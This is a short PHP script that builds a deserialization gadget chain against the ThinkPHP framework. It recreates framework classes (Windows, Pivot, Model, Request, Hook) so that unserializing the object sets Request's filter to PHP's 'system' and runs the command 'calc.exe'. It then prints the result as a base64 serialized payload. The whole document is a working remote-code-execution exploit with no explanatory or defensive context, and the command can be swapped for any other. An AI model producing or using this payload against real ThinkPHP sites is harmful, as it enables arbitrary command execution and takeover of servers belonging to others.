<?php
namespace think;
abstract class Model
{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["a"=>["calc.exe"]];
        $this->data = ["a"=>new Request()];
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];
    public function __construct()
    {
        $this->files = [new Pivot()];
    }
}
namespace think;
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = new Hook();
        $this->hook = ["append"=>[$this,"isAjax"]];
    }

}
namespace think;
class Hook{
    private $tags = ["var_ajax"=>'a'];
    public function get($tag = '')
    {
        if (empty($tag)) {
            //获取全部的插件信息
            return $this->tags;
        } else {
            return array_key_exists($tag, $this->tags) ? $this->tags[$tag] : [];
        }
    }
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
